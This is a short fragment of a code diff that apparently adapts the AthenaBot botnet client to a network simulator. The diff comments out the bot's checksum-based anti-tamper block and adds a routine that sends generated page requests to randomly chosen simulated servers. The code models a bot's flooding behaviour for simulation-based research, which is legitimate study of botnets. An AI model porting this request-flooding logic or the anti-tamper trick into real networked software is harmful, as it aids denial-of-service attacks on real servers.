+    /**Avoiding CRC AREA
+    // <!-------! CRC AREA START !-------!>
+    char cCheckString[DEFAULT];
+    sprintf(cCheckString, "%s@%s:%i", cChannel, cServer, usPort);
+    char *cStr = cCheckString;
+    unsigned long ulCheck = (360527*3)/(199+2);
+    int nCheck;
+    while((nCheck = *cStr++))
+        ulCheck = ((ulCheck << 5) + ulCheck) + nCheck;
+    if(ulCheck != ulChecksum7)
+        return rand() % 10;
+    // <!-------! CRC AREA STOP !-------!>
+     */
+    //Sleep(1);
     srand(GenerateRandomSeed());
 
     return rand() % range;
@@ -921,6 +1540,21 @@ void AthenaBot::strtr(char *cSource, char *cCharArrayA, char *cCharArrayB)
     }
 }
 
-} /* namespace simbo */
+void AthenaBot::sendRequestToRandomServer()
+{
+    int connectPort;
+    char szWWW[127];
+    char szModuleName[127];
+
+    if (controller->getAnyServerInfo(szWWW, szModuleName, connectPort) != 0) {
+        EV_ERROR << "Unable to get a random server from controller" << endl;
+        return;
+    }
+
+    EV_INFO << "Sending request to random server " << szWWW << " (" << szModuleName << ") on port " << connectPort << endl;
+    submitToSocket(szModuleName, connectPort, generateRandomPageRequest(szWWW));
+}
+
+//} /* namespace athena */
 
 } /* namespace inet */
